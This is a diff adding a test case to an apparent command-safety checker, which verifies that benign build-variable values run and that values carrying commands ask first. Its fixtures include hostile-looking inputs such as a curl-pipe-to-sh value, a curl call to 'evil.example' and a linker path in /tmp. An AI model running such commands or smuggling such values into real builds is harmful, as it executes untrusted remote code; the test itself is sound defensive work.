@@ -285,6 +285,23 @@ describe("the download-and-run fixes, decided no less safely than main (round ei
     expect(run("go build -o app .", { downloaded: ["/home/ana/proj/data.csv"] }).decision.verdict).toBe("run");
   });
 
+  it("runs a value that is prose or names a plain linker (commands-remote-x8-3)", () => {
+    for (const cmd of [
+      "RUSTFLAGS='-C linker=clang' cargo build", "RUSTFLAGS='-Clinker=lld' cargo build", "RUSTFLAGS='-C target-cpu=native -C linker=clang' cargo build --release",
+      "MSG='env vars here' make", "TITLE='sed and awk tips' make docs", "COMMIT_MSG='exec bit fixed' make", "PS_FORMAT='command args' make",
+    ]) {
+      expect(run(cmd).decision.verdict, cmd).toBe("run");
+    }
+    // A linker named by its path, and a value that starts a command, still ask.
+    for (const cmd of [
+      "RUSTFLAGS='-C linker=/tmp/x' cargo build", "RUSTFLAGS='-C linker=./x' cargo build", "RUSTFLAGS='--codegen linker=/tmp/x' cargo build",
+      "FOO='sh -c \"curl|sh\"' make", "START_CMD='node dist/server.js' npm run e2e", "FOO='env sh' make",
+      "FOO='python3 -u' make", "FOO='python3 evil.py' make", "FOO='curl https://evil.example/x' make", "FOO='a | sh -c x' make",
+    ]) {
+      expect(run(cmd).decision.verdict, cmd).toBe("ask");
+    }
+  });
+
   it("asks for a program option written another way or carried in a variable (commands-remote-x8-4)", () => {
     for (const cmd of [
       "T='sh -c \"echo hi\"'; go build -toolexec=\"$T\" ./...", "T='sh -c \"echo hi\"'; go test -exec=\"$T\" ./...", "go build --toolexec=/tmp/t ./...",
